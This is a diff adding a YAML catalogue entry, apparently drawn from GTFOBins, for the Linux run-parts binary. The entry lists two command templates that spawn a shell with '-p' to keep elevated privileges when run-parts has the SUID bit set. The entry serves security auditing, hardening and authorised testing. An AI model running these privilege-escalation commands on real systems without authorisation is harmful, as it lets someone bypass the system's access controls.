@@ -1,0 +1,27 @@
+id: gtfobins/run-parts/shell/suid
+type: binary
+platform: linux
+name: run-parts
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: run-parts --new-session --regex '^sh$' /bin --arg='-p'
+- template: 'cp /bin/sh /path/to/temp-dir/
+
+    run-parts /path/to/temp-dir/ --arg=''-p'''
+references:
+- https://gtfobins.github.io/gtfobins/run-parts/
+tags:
+- linux
+- unix
+- gtfobins
